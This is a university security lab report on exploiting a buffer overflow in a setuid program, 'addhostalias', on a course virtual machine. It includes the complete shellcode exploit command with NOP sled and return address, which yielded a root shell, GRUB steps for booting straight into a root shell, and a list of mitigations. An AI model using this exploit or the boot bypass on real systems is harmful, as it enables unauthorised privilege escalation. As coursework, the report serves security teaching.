@@ -1,0 +1,214 @@
+Lab 2 TDA602 [Language-Based Security ]
+r00tShell
+
+Done by:
+Ruslan Masinjila
+Oleksii Prykhodko
+
+/////////////////////////////////////////////////////////////
+
+IDENTIFICATION AND EXPLOITATION OF VULNERABILITY
+
+/////////////////////////////////////////////////////////////
+
+After downloading the virtual machine, which came with the source code of the program, along with its binary, the following steps were taken in order to exploit the program.
+
+---------------------------------------------
+STEP 1. Identification of the Vulnerability.
+---------------------------------------------
+
+The first step was to identify where, and how, in the given source code, buffer overflow can happen. In this case, the program allocates 256 bytes of characters to a buffer, called "formatbuffer", which is then written, through "sprintf" procedure at line 17 of the source code, by ip, hostname and alias, all of which are arrays of characters. At this point, one realizes that the buffer of 256 bytes can be overflown through the ip, hostname, and alias arguments to the program.
+
+----------------------------------
+STEP 2. Observation of the stack.
+----------------------------------
+
+If a stack is thought of as a column of memory, than in this case (x86 family), the stack grows downwards when new local variables are added to the stack, while the buffer, grows upwards. As the stack grows downwards, it eventually and respectivelly, to the bottom of the stack, appends the return address, and the base pointer, each of which is 4 bytes long in x86 architecture. The resulting stack would roughly look as shown in Figure 1 below:
+
+
+
+Stack (Before Attack)
+
++-------------------+
+|Calling Function   |
+|                   |
+|-------------------|
+|                   |
+|Parameters         |
+|                   |
+|-------------------|
+|                   |
+|Return Address     | 4 bytes
+|                   |
+|-------------------|
+|                   |
+|Base Pointer       | 4 bytes
+|                   |
+|-------------------|--TOP OF BUFFER
+|                   |
+|                   |
+|                   |
+|Buffer             | 256 bytes
+|                   |
+|                   |
+|                   |
+|                   |
+|-------------------|--BOTTOM OF BUFFER
+|                   |
+|Source Code        | (Read Only)  
+|                   |
++-------------------+
+
+=========
+FIGURE 1 
+=========
+
+
+----------------------
+STEP 3. Exploitation.
+----------------------
+At this point, it is known that it takes 256+4+4=264 bytes to overflow the buffer (in \x86 architecture), and, subsequently, overwrite the Return address (since the buffer grows upwards). Now, if some malicious shellcode is injected into the buffer, sandwiched between \x90s (No Operation (NOP)), and a new  return address pointing to the \x90s as shown in Figure 2, it is possible, by overwriting the original return address with new address, to redirect the program so that it executes the malicious shelllcode.
+
+NB: \x90 or NOP is an instruction that does nothing, but can be used to gradually lead the program to execute the shellcode.
+
+The given shellcode is 75 bytes long, and there are three inputs to the main function of addhostalias (ip, hostname, and alias respectivelly). If the ip and hostname are 1 byte each, and the shellcode is injected through alias, then the rest of the overflown buffer should be 264-75-(1+1)=187 bytes.
+
+Now, If  40 of the 187 bytes of the overflown buffer are allocated to point to \x90s, then up to 187-40=147 NOPs can be used to pad the shellcode at the bottom of the buffer. The resulting tentative attack on addhostalias would look as follows.
+
+1 byte for ip
+1 byte for hostname
+147 bytes for NOP (\x90s)
+75 bytes for malicious shellcode
+40 bytes for return address
+
+Total is 264 bytes, which is 2 bytes more than buffer can hold, and just enough to overwrite the return address.
+
+However, at this point, it is not known if the overwriting return address will redirect the program to the malicious code, but it can nevertheless be arbitrarily chosen, say "\x01\x02\x03\x04", repeated 10 times (i.e 40 bytes). In other words, while the arbitrary new address overwrites the return address, it doesn't necessarily point to where the NOP sleds are located, and, therefore, will most likely result in segmentation fault when the program is executed. In order to pinpoint where the NOP sleds are located in the stack upon execution of the program, the GDB command line debugger was used. The manner in which the debugger was used to identify the addresses is as follows:
+
+a. From the home directory, gdb was run with addhostalias as follows:
+>gdb addhostalias
+
+b. A break point was set at line 17 (where the overflow happens), as follows.
+(gdb) break add_alias 
+Breakpoint 1 at 0x8048549: file addhostalias.c, line 17.
+
+c. The vulnerable program was exploited using 1 byte for ip (\x90), 1 byte for hostname (\x90), 147 bytes of NOPs, 75 bytes of shellcode, and 40 bytes of return address with the initial  tentative address set to "\x01\x02\x03\x04" as follows:
+
+(gdb) run "\x90" "\x90" $(python -c 'print "\x90"*147 + "\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  + "\x01\x02\x03\x04"*10')
+
+
+d. The registers and addresses were viewed inside the gdb using <x/300x $sp> command
+
+e. The middle of \x90 sled was found to be at address 0xbffffd14
+
+f. Using little-endian notation, the tentative address "\x01\x02\x03\x04"*10 was then replaced by the actual address "\x14\xfd\xff\xbf"*10, and the resulting input to the program became:
+
+"\x90" "\x90" $(python -c 'print "\x90"*147 + "\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  + "\x14\xfd\xff\xbf"*10').
+
+g. At this point, the stack would look as follows:
+
+Stack (After Attack)
+
++-------------------+
+|Calling Function   |
+|                   |
+|-------------------|
+|                   |
+|Parameters         |
+|                   |
+|-------------------|
+|                   |
+|                   |
+|                   |
+|Return address     |  40 bytes
+|(0xbffffd14)       |
+|                   |
+|                   | 
+|                   |
+|                   |--TOP OF BUFFER
+|-------------------|
+|Shellcode          | 75 bytes
+|-------------------|
+|\x90 (NOP)         | 147 bytes centered at around 0xbffffd14
+|-------------------|                   
+|hostname           | 1 byte
+|-------------------|                  
+|ip                 | 1 byte
+|-------------------|--BOTTOM OF BUFFER
+|                   |
+|Source Code        | (Read Only)  
+|                   |
++-------------------+
+
+=========
+FIGURE 2
+=========
+
+h. After exiting the gdb debugger, the vulnerable program in /usr/bin directory with root privilages was executed using the following command.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+./addhostalias "\x90" "\x90" $(python -c 'print "\x90"*147 + "\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  + "\x14\xfd\xff\xbf"*10')
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Upon execution of the above command, a shell (sh-2.05a#) appeared and when the command "whoami" was entered in the shell, the response was "root", suggesting that the attack was successful
+
+/////////////////////////////////////////////////////////////
+
+SCRIPTS AND PROGRAMS USED
+
+/////////////////////////////////////////////////////////////
+
+The shellcode inside the python script was copied, reformatted slightly, and used directly as part of the arguments to the vulnerable program. Additionally, two bash scripts were written in order to automate the processes of launching the virtual machine through QEMU, and connecting to the virtual machine through ssh.
+
+/////////////////////////////////////////////////////////////
+
+REGAINING ROOT ACCESS
+
+/////////////////////////////////////////////////////////////
+
+The most straight forward method, assuming one has access to the compromised system, is to boot the operating system straight into the root shell. In distributions like ubuntu for example, it can be done by altering the grub menu during startup, whereby "ro  quiet splash $vt_handoff" is changed to "rw init=/bin/bash". Once the changes are saved, the system will boot straight into root shell from where the administrator can perform recovery. In ubuntu distributions for example, it can be done as follows:
+1. While booting the system, Press ESC at the GRUB prompt, and go into GRUB menu.
+2. Press 'e' to edit the kernel you want.
+3. Press 'e' again to edit it.
+4. One of the lines should contain the string "ro  quiet splash". Replace this string with "rw init=/bin/bash"
+5. Save the changes, and continue the boot.
+6. You are now root.
+
+N.B: Other distros of linux might have some variations, but the idea is the same.
+
+/////////////////////////////////////////////////////////////
+
+REPRODUCTION OF THE ATTACK
+
+/////////////////////////////////////////////////////////////
+
+We think the best way to reproduce the attack is to keep concise notes of everything we do, and all references used, while attacking the system. It is also very important to back the progress up as regularly as possible, and creating checkpoints when new breakthroughs happen (through git tags for example). As for ~/.bash_history, yes it is possible to see previously executed commands, and in this case, we figured that the file "exploit.py" had what we think the full exploitation code. It was later removed however, but nevertheless the history gave some us hints, like how to run the program with a python script.
+
+
+/////////////////////////////////////////////////////////////
+
+SHELL CODE
+
+/////////////////////////////////////////////////////////////
+
+The shellcode sets real user id from effective user id with "\x31\xc0" and sets real group id from effective user id with "\xb0\x47"
+
+
+/////////////////////////////////////////////////////////////
+
+MITIGATION OF THE PROBLEMS
+
+/////////////////////////////////////////////////////////////
+
+1. Bounds checking: Ensure that a variable is of specified type and falls within the defined range before it is used.
+2. Using safe functions: Use strncat instead of strcat, strncpy instead of strcpy, and so on.
+3. Non-executable stacks: Making the stack portion of a user process's virtual address space non-executable. Therefore, a malicious program introduced onto the stack cannot be executed.
+4. Periodic automated or manual code auditing whereby the code of both experienced and amateur programmers is reviewed by their peers.
+
+At the end of the day, the C programming language is considered unsafe and assumes the programmers know what they do, and it will let them to do what they wish. But if the programmers are not careful, it opens door to multitude of problems.
+
+
+
+Lessons learned:
+- One of the bugs we faced was using x90 instead of \x90 while running the program. It lead to unexptected results. Luckily we found the x90 that was messing up the entire code.
+
